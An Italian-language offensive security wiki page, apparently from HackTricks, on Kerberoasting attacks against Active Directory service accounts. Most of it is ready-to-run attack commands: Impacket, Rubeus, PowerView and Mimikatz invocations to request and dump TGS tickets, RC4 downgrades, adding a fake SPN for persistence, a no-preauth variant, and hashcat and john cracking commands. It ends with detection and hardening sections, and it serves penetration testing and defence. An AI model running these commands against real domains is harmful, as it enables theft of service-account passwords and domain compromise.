# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting si concentra sull'acquisizione dei biglietti TGS, specificamente quelli relativi ai servizi che operano sotto account utente in Active Directory (AD), escludendo gli account computer. La crittografia di questi biglietti utilizza chiavi che originano dalle password degli utenti, consentendo il cracking delle credenziali offline. L'uso di un account utente come servizio è indicato da una proprietà ServicePrincipalName (SPN) non vuota.

Qualsiasi utente autenticato del dominio può richiedere biglietti TGS, quindi non sono necessari privilegi speciali.

### Punti Chiave

- Targetizza i biglietti TGS per servizi che girano sotto account utente (cioè, account con SPN impostato; non account computer).
- I biglietti sono crittografati con una chiave derivata dalla password dell'account di servizio e possono essere crackati offline.
- Non sono richiesti privilegi elevati; qualsiasi account autenticato può richiedere biglietti TGS.

> [!WARNING]
> La maggior parte degli strumenti pubblici preferisce richiedere biglietti di servizio RC4-HMAC (etype 23) perché sono più veloci da crackare rispetto a AES. Gli hash TGS RC4 iniziano con `$krb5tgs$23$*`, AES128 con `$krb5tgs$17$*`, e AES256 con `$krb5tgs$18$*`. Tuttavia, molti ambienti stanno passando a solo AES. Non assumere che solo RC4 sia rilevante.
> Inoltre, evita il roasting “spray-and-pray”. Il kerberoast predefinito di Rubeus può interrogare e richiedere biglietti per tutti gli SPN ed è rumoroso. Enumera e targetizza prima i principi interessanti.

### Attacco

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Strumenti multi-funzione che includono controlli kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerare gli utenti kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Tecnica 1: Richiedi TGS e scarica dalla memoria
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tecnica 2: Strumenti automatici
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Una richiesta TGS genera l'Evento di Sicurezza di Windows 4769 (È stato richiesto un biglietto di servizio Kerberos).

### OPSEC e ambienti solo AES

- Richiedi RC4 appositamente per account senza AES:
- Rubeus: `/rc4opsec` utilizza tgtdeleg per enumerare account senza AES e richiede biglietti di servizio RC4.
- Rubeus: `/tgtdeleg` con kerberoast attiva anche richieste RC4 dove possibile.
- Arrostire account solo AES invece di fallire silenziosamente:
- Rubeus: `/aes` enumera account con AES abilitato e richiede biglietti di servizio AES (tipo 17/18).
- Se possiedi già un TGT (PTT o da un .kirbi), puoi usare `/ticket:<blob|path>` con `/spn:<SPN>` o `/spns:<file>` e saltare LDAP.
- Targeting, limitazione e meno rumore:
- Usa `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` e `/jitter:<1-100>`.
- Filtra per password deboli probabili usando `/pwdsetbefore:<MM-dd-yyyy>` (password più vecchie) o targetizza OUs privilegiati con `/ou:<DN>`.

Esempi (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistenza / Abuso

Se controlli o puoi modificare un account, puoi renderlo kerberoastable aggiungendo un SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Downgrade un account per abilitare RC4 per una facile decifratura (richiede privilegi di scrittura sull'oggetto target):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
Puoi trovare strumenti utili per attacchi kerberoast qui: https://github.com/nidem/kerberoast

Se ricevi questo errore da Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` è dovuto a uno squilibrio dell'ora locale. Sincronizza con il DC:

- `ntpdate <DC_IP>` (deprecato su alcune distribuzioni)
- `rdate -n <DC_IP>`

### Rilevamento

Il kerberoasting può essere furtivo. Cerca l'ID evento 4769 dai DC e applica filtri per ridurre il rumore:

- Escludi il nome del servizio `krbtgt` e i nomi dei servizi che terminano con `$` (account computer).
- Escludi le richieste da account macchina (`*$$@*`).
- Solo richieste riuscite (Codice di errore `0x0`).
- Tieni traccia dei tipi di crittografia: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Non allertare solo su `0x17`.

Esempio di triage PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Ulteriori idee:

- Stabilire un uso normale degli SPN per host/utente; allertare su grandi picchi di richieste SPN distinte da un singolo principale.
- Segnalare un uso insolito di RC4 in domini rinforzati con AES.

### Mitigazione / Indurimento

- Utilizzare gMSA/dMSA o account macchina per i servizi. Gli account gestiti hanno password casuali di oltre 120 caratteri e ruotano automaticamente, rendendo impraticabile la decifratura offline.
- Forzare AES sugli account di servizio impostando `msDS-SupportedEncryptionTypes` su solo AES (decimale 24 / esadecimale 0x18) e poi ruotando la password in modo che le chiavi AES siano derivate.
- Dove possibile, disabilitare RC4 nel proprio ambiente e monitorare i tentativi di utilizzo di RC4. Sui DC è possibile utilizzare il valore di registro `DefaultDomainSupportedEncTypes` per indirizzare i valori predefiniti per gli account senza `msDS-SupportedEncryptionTypes` impostato. Testare accuratamente.
- Rimuovere SPN non necessari dagli account utente.
- Utilizzare password lunghe e casuali per gli account di servizio (25+ caratteri) se gli account gestiti non sono fattibili; vietare password comuni e auditare regolarmente.

### Kerberoast senza un account di dominio (ST richiesti da AS)

Nel settembre 2022, Charlie Clark ha dimostrato che se un principale non richiede la pre-autenticazione, è possibile ottenere un ticket di servizio tramite un KRB_AS_REQ creato alterando il sname nel corpo della richiesta, ottenendo effettivamente un ticket di servizio invece di un TGT. Questo rispecchia il roasting AS-REP e non richiede credenziali di dominio valide.

Vedi dettagli: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Devi fornire un elenco di utenti perché senza credenziali valide non puoi interrogare LDAP con questa tecnica.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Correlati

Se stai prendendo di mira utenti AS-REP roastable, vedi anche:

{{#ref}}
asreproast.md
{{#endref}}

## Riferimenti

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Guida di Microsoft per aiutare a mitigare il Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Documentazione su Rubeus Roasting: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
